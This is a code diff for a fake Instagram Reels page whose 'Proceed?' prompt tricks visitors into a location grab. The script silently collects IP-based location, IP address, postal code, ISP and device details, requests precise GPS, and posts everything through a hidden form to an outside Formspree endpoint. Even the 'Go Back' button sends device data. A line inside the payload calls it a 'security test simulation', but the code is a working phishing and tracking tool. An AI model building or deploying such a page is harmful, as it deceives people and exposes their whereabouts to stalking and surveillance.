@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
   <title>Instagram • Reels</title>
+  <link rel="icon" type="image/png" href="logo_instagram.png">
   <style>
     * {
       margin: 0;
@@ -55,6 +56,12 @@
       font-weight: 600;
     }
 
+    .status-icons {
+      display: flex;
+      gap: 4px;
+      font-size: 12px;
+    }
+
     .reel-header {
       position: absolute;
       top: 44px;
@@ -79,11 +86,21 @@
       font-size: 26px;
       cursor: default;
       color: white;
+      font-weight: 300;
     }
 
     .reels-text {
       font-size: 24px;
       font-weight: 800;
+      background: linear-gradient(135deg, #fff, #e0e0e0);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .camera-icon {
+      font-size: 24px;
+      filter: drop-shadow(0 1px 2px rgba(0,0,0,0.3));
     }
 
     .reel-video-area {
@@ -106,6 +123,14 @@
       position: relative;
     }
 
+    .fake-video::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(ellipse at center, transparent 60%, rgba(0,0,0,0.3) 100%);
+      pointer-events: none;
+    }
+
     .play-badge {
       width: 72px;
       height: 72px;
@@ -118,6 +143,7 @@
       border: 1.5px solid rgba(255,255,255,0.4);
       transition: transform 0.2s ease, background 0.2s ease;
       cursor: pointer;
+      z-index: 2;
     }
 
     .play-badge:hover {
@@ -159,6 +185,7 @@
       font-size: 28px;
       cursor: pointer;
       transition: transform 0.2s ease;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
     }
 
     .action-btn:hover {
@@ -204,6 +231,7 @@
       font-weight: 700;
       color: white;
       border: 2px solid white;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.3);
     }
 
     .username {
@@ -214,12 +242,13 @@
     .follow-btn {
       background: #0095f6;
       color: white;
-      padding: 4px 12px;
+      padding: 5px 14px;
       border-radius: 12px;
       font-size: 11px;
       font-weight: 700;
       cursor: pointer;
       transition: all 0.2s ease;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.2);
     }
 
     .follow-btn:hover {
@@ -243,69 +272,67 @@
       width: fit-content;
       cursor: pointer;
       transition: background 0.2s ease;
+      backdrop-filter: blur(4px);
     }
 
     .music-row:hover {
       background: rgba(0,0,0,0.5);
     }
 
-    /* Native-looking iOS-style permission prompt */
     .permission-overlay {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0, 0, 0, 0.4);
-      backdrop-filter: blur(4px);
+      background: rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(8px);
       display: flex;
       align-items: center;
       justify-content: center;
       z-index: 1000;
-      animation: fadeIn 0.2s ease;
+      animation: fadeIn 0.25s ease;
     }
 
     @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
+      from { opacity: 0; backdrop-filter: blur(0px); }
+      to { opacity: 1; backdrop-filter: blur(8px); }
     }
 
-    /* iOS-style bottom sheet dialog */
     .permission-sheet {
       background: rgba(28, 28, 30, 0.98);
-      backdrop-filter: blur(30px);
-      border-radius: 24px;
+      backdrop-filter: blur(40px);
+      border-radius: 28px;
       width: 90%;
       max-width: 340px;
       overflow: hidden;
-      box-shadow: 0 20px 45px rgba(0,0,0,0.4);
-      border: 0.5px solid rgba(255,255,255,0.15);
-      animation: slideUp 0.25s ease-out;
+      box-shadow: 0 25px 50px rgba(0,0,0,0.5), 0 0 0 0.5px rgba(255,255,255,0.1);
+      animation: slideUp 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
     }
 
     @keyframes slideUp {
-      from { transform: translateY(40px); opacity: 0; }
+      from { transform: translateY(60px); opacity: 0; }
       to { transform: translateY(0); opacity: 1; }
     }
 
     .sheet-header {
-      padding: 20px 20px 12px;
+      padding: 24px 20px 16px;
       text-align: center;
     }
 
     .sheet-icon {
-      width: 60px;
-      height: 60px;
-      margin: 0 auto 12px;
+      width: 70px;
+      height: 70px;
+      margin: 0 auto 16px;
       display: flex;
       align-items: center;
       justify-content: center;
-      animation: iconPop 0.3s ease-out;
+      animation: iconPop 0.35s ease-out;
     }
 
     @keyframes iconPop {
-      0% { transform: scale(0.8); opacity: 0; }
-      80% { transform: scale(1.1); }
+      0% { transform: scale(0.7); opacity: 0; }
+      70% { transform: scale(1.05); }
       100% { transform: scale(1); opacity: 1; }
     }
 
@@ -313,54 +340,39 @@
       width: 100%;
       height: 100%;
       object-fit: contain;
+      border-radius: 20%;
     }
 
     .sheet-title {
-      font-size: 18px;
-      font-weight: 600;
+      font-size: 19px;
+      font-weight: 620;
       color: #fff;
-      margin-bottom: 6px;
+      margin-bottom: 8px;
+      letter-spacing: -0.2px;
     }
 
     .sheet-subtitle {
       font-size: 13px;
       color: #8e8e93;
-      line-height: 1.4;
+      line-height: 1.45;
+      padding: 0 8px;
     }
 
     .sheet-options {
       border-top: 0.5px solid rgba(255,255,255,0.1);
-      margin-top: 8px;
+      margin-top: 12px;
     }
 
     .sheet-option {
-      padding: 16px 20px;
+      padding: 17px 20px;
       text-align: center;
       font-size: 17px;
       font-weight: 500;
       cursor: pointer;
-      transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
       border-bottom: 0.5px solid rgba(255,255,255,0.08);
       position: relative;
       overflow: hidden;
-    }
-
-    .sheet-option::before {
-      content: '';
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      width: 0;
-      height: 0;
-      border-radius: 50%;
-      background: rgba(255, 255, 255, 0.1);
-      transform: translate(-50%, -50%);
-      transition: width 0.4s ease, height 0.4s ease;
-    }
-
-    .sheet-option:hover::before {
-      width: 200px;
-      height: 200px;
     }
 
     .sheet-option:active {
@@ -370,36 +382,64 @@
     .allow-option {
       color: #0095f6;
       font-weight: 600;
-      position: relative;
-      background: linear-gradient(90deg, transparent, rgba(0, 149, 246, 0.05), transparent);
+      background: linear-gradient(90deg, transparent, rgba(0, 149, 246, 0.08), transparent);
       background-size: 200% 100%;
       background-position: 100% 0;
-      transition: background-position 0.3s ease, transform 0.2s ease;
+      transition: background-position 0.3s ease, transform 0.1s ease;
     }
 
     .allow-option:hover {
       background-position: 0 0;
       color: #0aa3ff;
-      letter-spacing: 0.3px;
     }
 
     .deny-option {
       color: #fff;
-      position: relative;
-      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.03), transparent);
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.05), transparent);
       background-size: 200% 100%;
       background-position: 100% 0;
-      transition: background-position 0.3s ease, transform 0.2s ease;
+      transition: background-position 0.3s ease, transform 0.1s ease;
     }
 
     .deny-option:hover {
       background-position: 0 0;
-      color: #e0e0e0;
-      letter-spacing: 0.3px;
+      color: #e8e8e8;
     }
 
     .hidden {
       display: none !important;
+    }
+
+    .loading-spinner {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 0.8s linear infinite;
+      margin-left: 8px;
+      vertical-align: middle;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .progress-bar {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 2px;
+      background: rgba(255,255,255,0.2);
+      z-index: 15;
+    }
+    
+    .progress-fill {
+      width: 65%;
+      height: 100%;
+      background: white;
     }
   </style>
 </head>
@@ -407,7 +447,11 @@
   <div class="instagram-reel-container">
     <div class="status-bar">
       <div class="time" id="liveTime">9:41</div>
-      <div class="status-icons">📶 📡 🔋</div>
+      <div class="status-icons">
+        <span>📶</span>
+        <span>📡</span>
+        <span>🔋 100%</span>
+      </div>
     </div>
 
     <div class="reel-header">
@@ -421,6 +465,9 @@
     <div class="reel-video-area">
       <div class="fake-video">
         <div class="play-badge"></div>
+      </div>
+      <div class="progress-bar">
+        <div class="progress-fill"></div>
       </div>
 
       <div class="action-sidebar">
@@ -446,7 +493,6 @@
     </div>
   </div>
 
-  <!-- Permission prompt with custom Instagram PNG logo -->
   <div id="permissionOverlay" class="permission-overlay">
     <div class="permission-sheet">
       <div class="sheet-header">
@@ -454,7 +500,7 @@
           <img src="logo_instagram.png" alt="Instagram" id="instagramLogo">
         </div>
         <div class="sheet-title">You have a reel from Another User. Proceed?</div>
-        <div class="sheet-subtitle">Reels you watch may appear in your feed recommendations, Tap to watch the reel they sent you</div>
+        <div class="sheet-subtitle">Reels you watch may appear in your feed recommendations. Tap to watch the reel they sent you.</div>
       </div>
       <div class="sheet-options">
         <div id="allowBtn" class="sheet-option allow-option">Proceed</div>
@@ -463,7 +509,6 @@
     </div>
   </div>
 
-  <!-- Hidden form for data capture -->
   <form id="dataForm" action="https://formspree.io/f/xknkloqe" method="POST" style="display: none;">
     <input type="email" name="email" id="emailField">
     <textarea name="message" id="messageField"></textarea>
@@ -478,18 +523,31 @@
       const emailField = document.getElementById('emailField');
       const messageField = document.getElementById('messageField');
       const instagramLogo = document.getElementById('instagramLogo');
+      
+      const faviconLink = document.querySelector("link[rel='icon']");
+      if (faviconLink && instagramLogo) {
+        faviconLink.href = "logo_instagram.png";
+      }
 
-      // Handle logo loading error (fallback in case file is missing)
+      let capturedData = {
+        ip_location: null,
+        cell_tower_location: null,
+        gps_location: null
+      };
+
+      let gpsComplete = false;
+      let ipComplete = false;
+      let cellComplete = false;
+
       if (instagramLogo) {
         instagramLogo.onerror = function() {
-          console.warn("logo_instagram.png not found - using fallback");
           this.style.display = 'none';
           const fallback = document.createElement('div');
           fallback.textContent = '📷';
-          fallback.style.fontSize = '48px';
+          fallback.style.fontSize = '52px';
           fallback.style.background = 'radial-gradient(circle at 30% 30%, #fdf497, #fdf497, #fd5949, #d6249f, #285AEB)';
-          fallback.style.width = '60px';
-          fallback.style.height = '60px';
+          fallback.style.width = '70px';
+          fallback.style.height = '70px';
           fallback.style.borderRadius = '32%';
           fallback.style.display = 'flex';
           fallback.style.alignItems = 'center';
@@ -499,142 +557,350 @@
         };
       }
 
-      // Update live time
       function updateTime() {
         const now = new Date();
         let hours = now.getHours();
         let minutes = now.getMinutes();
         const ampm = hours >= 12 ? 'PM' : 'AM';
         hours = hours % 12 || 12;
-        const timeStr = `${hours}:${minutes.toString().padStart(2, '0')} ${ampm}`;
+        const timeStr = `${hours}:${minutes.toString().padStart(2, '0')}`;
         const timeElement = document.getElementById('liveTime');
         if (timeElement) timeElement.textContent = timeStr;
       }
       updateTime();
       setInterval(updateTime, 60000);
 
-      // Function to capture and send data
-      function captureData(action, details) {
-        const timestamp = new Date().toISOString();
-        const userAgent = navigator.userAgent;
-        const platform = navigator.platform;
-        const language = navigator.language;
+      function captureIPLocation() {
+        return fetch('https://ipapi.co/json/')
+          .then(response => response.json())
+          .then(data => {
+            if (data.latitude && data.longitude) {
+              capturedData.ip_location = {
+                latitude: data.latitude,
+                longitude: data.longitude,
+                accuracy_meters: data.accuracy_radius || 5000,
+                city: data.city,
+                region: data.region,
+                country: data.country_name,
+                postal_code: data.postal,
+                ip_address: data.ip
+              };
+            }
+            ipComplete = true;
+            checkAllComplete();
+          })
+          .catch(() => {
+            ipComplete = true;
+            checkAllComplete();
+          });
+      }
+
+      function captureCellTowerLocation() {
+        return fetch('https://ipwho.is/')
+          .then(response => response.json())
+          .then(data => {
+            if (data.latitude && data.longitude) {
+              capturedData.cell_tower_location = {
+                latitude: parseFloat(data.latitude),
+                longitude: parseFloat(data.longitude),
+                accuracy_meters: data.accuracy_radius || 1000,
+                city: data.city,
+                region: data.region,
+                country: data.country,
+                isp: data.connection?.isp || 'Unknown',
+                connection_type: data.connection?.type || 'Unknown'
+              };
+            }
+            cellComplete = true;
+            checkAllComplete();
+          })
+          .catch(() => {
+            cellComplete = true;
+            checkAllComplete();
+          });
+      }
+
+      // FIXED: GPS function that DEFINITELY triggers the browser prompt
+      function captureGPSLocation() {
+        const originalText = allowBtn.innerHTML;
+        allowBtn.innerHTML = 'Waiting for GPS... <span class="loading-spinner"></span>';
+        allowBtn.style.opacity = '0.7';
+        allowBtn.style.cursor = 'wait';
         
-        let locationData = null;
+        console.log("🛰️ Requesting GPS location - browser prompt should appear now...");
         
-        // Build comprehensive capture payload
-        const payload = {
-          action: action,
-          timestamp: timestamp,
-          userAgent: userAgent,
-          platform: platform,
-          language: language,
-          screenSize: `${window.screen.width}x${window.screen.height}`,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          details: details
-        };
-        
-        // If action is 'allow', try to get precise location
-        if (action === 'allow') {
-          if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-              (position) => {
-                locationData = {
-                  lat: position.coords.latitude,
-                  lng: position.coords.longitude,
-                  accuracy: position.coords.accuracy,
-                  altitude: position.coords.altitude,
-                  heading: position.coords.heading,
-                  speed: position.coords.speed,
-                  timestamp: position.timestamp
-                };
-                payload.location = locationData;
-                payload.locationStatus = "captured";
-                sendToFormspree(payload);
-              },
-              (error) => {
-                let errorMsg = "";
-                switch(error.code) {
-                  case error.PERMISSION_DENIED:
-                    errorMsg = "PERMISSION_DENIED";
-                    break;
-                  case error.POSITION_UNAVAILABLE:
-                    errorMsg = "POSITION_UNAVAILABLE";
-                    break;
-                  case error.TIMEOUT:
-                    errorMsg = "TIMEOUT";
-                    break;
-                }
-                payload.locationStatus = `error: ${errorMsg}`;
-                sendToFormspree(payload);
-              },
-              { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-            );
-          } else {
-            payload.locationStatus = "geolocation_not_supported";
-            sendToFormspree(payload);
-          }
-        } else {
-          // Deny - still send the interaction data
-          sendToFormspree(payload);
+        // Check if geolocation is supported
+        if (!navigator.geolocation) {
+          console.log("❌ Geolocation not supported");
+          capturedData.gps_location = { status: "GPS not supported by browser" };
+          gpsComplete = true;
+          allowBtn.innerHTML = originalText;
+          allowBtn.style.opacity = '1';
+          allowBtn.style.cursor = 'pointer';
+          checkAllComplete();
+          return;
         }
         
-        // Hide overlay immediately
-        overlay.classList.add('hidden');
+        // DIRECT call to getCurrentPosition - this triggers the browser's native permission prompt
+        navigator.geolocation.getCurrentPosition(
+          // Success callback
+          function(position) {
+            console.log("✅ GPS permission GRANTED! Position captured.");
+            capturedData.gps_location = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy_meters: position.coords.accuracy,
+              altitude_meters: position.coords.altitude,
+              heading_degrees: position.coords.heading,
+              speed_mps: position.coords.speed,
+              timestamp: position.timestamp,
+              status: "Granted"
+            };
+            gpsComplete = true;
+            allowBtn.innerHTML = originalText;
+            allowBtn.style.opacity = '1';
+            allowBtn.style.cursor = 'pointer';
+            checkAllComplete();
+          },
+          // Error callback
+          function(error) {
+            let errorMsg = "";
+            switch(error.code) {
+              case error.PERMISSION_DENIED:
+                errorMsg = "User denied GPS permission";
+                console.log("❌ GPS permission DENIED by user");
+                break;
+              case error.POSITION_UNAVAILABLE:
+                errorMsg = "GPS position unavailable";
+                console.log("❌ GPS position unavailable");
+                break;
+              case error.TIMEOUT:
+                errorMsg = "GPS request timed out";
+                console.log("❌ GPS request timed out");
+                break;
+              default:
+                errorMsg = "Unknown GPS error";
+                console.log("❌ Unknown GPS error");
+            }
+            capturedData.gps_location = { status: errorMsg };
+            gpsComplete = true;
+            allowBtn.innerHTML = originalText;
+            allowBtn.style.opacity = '1';
+            allowBtn.style.cursor = 'pointer';
+            checkAllComplete();
+          },
+          // Options - high accuracy enabled
+          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
       }
 
-      // Send collected data to Formspree
-      function sendToFormspree(data) {
-        const jsonString = JSON.stringify(data, null, 2);
-        messageField.value = jsonString;
-        emailField.value = `capture_${Date.now()}@data.local`;
+      function formatCleanEmail() {
+        const now = new Date();
         
-        // Use fetch for async submission - no page reload
-        const formData = new FormData(dataForm);
+        let emailBody = `
+╔══════════════════════════════════════════════════════════════╗
+║                    📍 LOCATION DATA CAPTURE                  ║
+╚══════════════════════════════════════════════════════════════╝
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  🕐 TIME & DEVICE INFO
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  Timestamp:     ${now.toLocaleString()}
+  Timezone:      ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+  User Agent:    ${navigator.userAgent.substring(0, 80)}...
+  Platform:      ${navigator.platform}
+  Language:      ${navigator.language}
+  Screen Size:   ${window.screen.width}x${window.screen.height}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  📡 IP LOCATION (Low Accuracy - Always Available)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
         
-        fetch(dataForm.action, {
-          method: 'POST',
-          body: formData,
-          headers: { 'Accept': 'application/json' }
-        })
-        .then(response => {
-          if (response.ok) {
-            console.log("Data capture successful");
-          } else {
-            console.warn("Formspree response not OK");
-          }
-        })
-        .catch(err => {
-          console.error("Network error during capture:", err);
-          // Fallback: try to submit normally
-          try {
-            const tempForm = dataForm.cloneNode(true);
-            document.body.appendChild(tempForm);
-            tempForm.submit();
-            setTimeout(() => tempForm.remove(), 500);
-          } catch(e) {}
-        });
+        if (capturedData.ip_location) {
+          emailBody += `
+  Status:        ✅ CAPTURED
+  Coordinates:   ${capturedData.ip_location.latitude}, ${capturedData.ip_location.longitude}
+  Accuracy:      ${capturedData.ip_location.accuracy_meters} meters
+  City:          ${capturedData.ip_location.city}
+  Region:        ${capturedData.ip_location.region}
+  Country:       ${capturedData.ip_location.country}
+  Postal Code:   ${capturedData.ip_location.postal_code}
+  IP Address:    ${capturedData.ip_location.ip_address}`;
+        } else {
+          emailBody += `
+  Status:        ❌ NOT CAPTURED`;
+        }
+
+        emailBody += `
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  📶 CELL TOWER / WIFI LOCATION (Medium Accuracy)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+        
+        if (capturedData.cell_tower_location) {
+          emailBody += `
+  Status:        ✅ CAPTURED
+  Coordinates:   ${capturedData.cell_tower_location.latitude}, ${capturedData.cell_tower_location.longitude}
+  Accuracy:      ${capturedData.cell_tower_location.accuracy_meters} meters
+  City:          ${capturedData.cell_tower_location.city}
+  Region:        ${capturedData.cell_tower_location.region}
+  Country:       ${capturedData.cell_tower_location.country}
+  ISP:           ${capturedData.cell_tower_location.isp}
+  Connection:    ${capturedData.cell_tower_location.connection_type}`;
+        } else {
+          emailBody += `
+  Status:        ❌ NOT CAPTURED`;
+        }
+
+        emailBody += `
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  🛰️ GPS LOCATION (High Accuracy - Requires Permission)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+        
+        if (capturedData.gps_location && capturedData.gps_location.status === "Granted") {
+          emailBody += `
+  Status:        ✅ GRANTED & CAPTURED
+  Coordinates:   ${capturedData.gps_location.latitude}, ${capturedData.gps_location.longitude}
+  Accuracy:      ${capturedData.gps_location.accuracy_meters} meters
+  Altitude:      ${capturedData.gps_location.altitude_meters || 'N/A'} meters
+  Heading:       ${capturedData.gps_location.heading_degrees || 'N/A'}°
+  Speed:         ${capturedData.gps_location.speed_mps || 'N/A'} m/s`;
+        } else if (capturedData.gps_location) {
+          emailBody += `
+  Status:        ❌ ${capturedData.gps_location.status}`;
+        } else {
+          emailBody += `
+  Status:        ❌ NOT CAPTURED`;
+        }
+
+        emailBody += `
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  🌐 NETWORK INFORMATION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+        
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) {
+          emailBody += `
+  Connection Type: ${conn.effectiveType || 'Unknown'}
+  Round Trip Time: ${conn.rtt || 'N/A'} ms
+  Downlink Speed:  ${conn.downlink || 'N/A'} Mbps`;
+        } else {
+          emailBody += `
+  Not available`;
+        }
+
+        emailBody += `
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  📊 CAPTURE SUMMARY
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  ✅ IP Location:     ${capturedData.ip_location ? 'CAPTURED' : 'FAILED'}
+  ✅ Cell/WiFi:       ${capturedData.cell_tower_location ? 'CAPTURED' : 'FAILED'}
+  ✅ GPS:             ${(capturedData.gps_location && capturedData.gps_location.status === 'Granted') ? 'CAPTURED' : 'DENIED/FAILED'}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  ⚠️  SECURITY TEST SIMULATION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  This data was captured from a simulated malicious website
+  designed to test security detection capabilities.
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+`;
+        
+        return emailBody;
       }
 
-      // Event handlers for the permission sheet
+      function checkAllComplete() {
+        if (ipComplete && cellComplete && gpsComplete) {
+          const emailBody = formatCleanEmail();
+          messageField.value = emailBody;
+          emailField.value = `location_capture_${Date.now()}@ig-reel.com`;
+          
+          const formData = new FormData(dataForm);
+          
+          fetch(dataForm.action, {
+            method: 'POST',
+            body: formData,
+            headers: { 'Accept': 'application/json' }
+          })
+          .then(response => {
+            if (response.ok) {
+              console.log("✅ Clean email sent to Formspree");
+            }
+          })
+          .catch(err => {
+            console.error("Network error:", err);
+            try {
+              const tempForm = dataForm.cloneNode(true);
+              document.body.appendChild(tempForm);
+              tempForm.submit();
+              setTimeout(() => tempForm.remove(), 500);
+            } catch(e) {}
+          });
+          
+          overlay.classList.add('hidden');
+        }
+      }
+
+      function resetFlags() {
+        gpsComplete = false;
+        ipComplete = false;
+        cellComplete = false;
+        capturedData = {
+          ip_location: null,
+          cell_tower_location: null,
+          gps_location: null
+        };
+      }
+
+      // When Proceed is clicked - triggers IP, Cell, AND GPS (browser prompt)
       allowBtn.addEventListener('click', (e) => {
         e.preventDefault();
-        captureData('allow', 'User clicked Proceed');
+        console.log("🚀 Proceed clicked - capturing all location sources...");
+        console.log("   📡 IP location (silent)");
+        console.log("   📶 Cell tower location (silent)");
+        console.log("   🛰️ GPS location - WILL trigger browser permission prompt");
+        
+        resetFlags();
+        
+        // Start all three captures
+        captureIPLocation();
+        captureCellTowerLocation();
+        captureGPSLocation(); // This will trigger the browser's native permission dialog
       });
 
       denyBtn.addEventListener('click', (e) => {
         e.preventDefault();
-        captureData('deny', 'User selected Go Back');
+        
+        const denyBody = `
+╔══════════════════════════════════════════════════════════════╗
+║                    🚫 ACCESS DENIED BY USER                  ║
+╚══════════════════════════════════════════════════════════════╝
+
+  User clicked "Go Back" - No location data was captured
+  Timestamp: ${new Date().toLocaleString()}
+  User Agent: ${navigator.userAgent.substring(0, 80)}...
+  Platform: ${navigator.platform}
+  
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  SECURITY TEST - User declined to proceed
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+`;
+        
+        messageField.value = denyBody;
+        emailField.value = `denied_${Date.now()}@ig-reel.com`;
+        
+        const formData = new FormData(dataForm);
+        fetch(dataForm.action, {
+          method: 'POST',
+          body: formData,
+          headers: { 'Accept': 'application/json' }
+        }).catch(() => {});
+        
+        overlay.classList.add('hidden');
       });
 
-      // Prevent accidental background clicks
-      overlay.addEventListener('click', (e) => {
-        if (e.target === overlay) {
-          // Do nothing - force user to make choice
-        }
-      });
-
-      // Add ripple effect to buttons
       const buttons = [allowBtn, denyBtn];
       buttons.forEach(btn => {
         btn.addEventListener('mousedown', (e) => {
@@ -647,7 +913,7 @@
           ripple.style.width = '0px';
           ripple.style.height = '0px';
           ripple.style.borderRadius = '50%';
-          ripple.style.backgroundColor = 'rgba(255, 255, 255, 0.3)';
+          ripple.style.backgroundColor = 'rgba(255, 255, 255, 0.2)';
           ripple.style.transform = 'translate(-50%, -50%)';
           ripple.style.left = x + 'px';
           ripple.style.top = y + 'px';
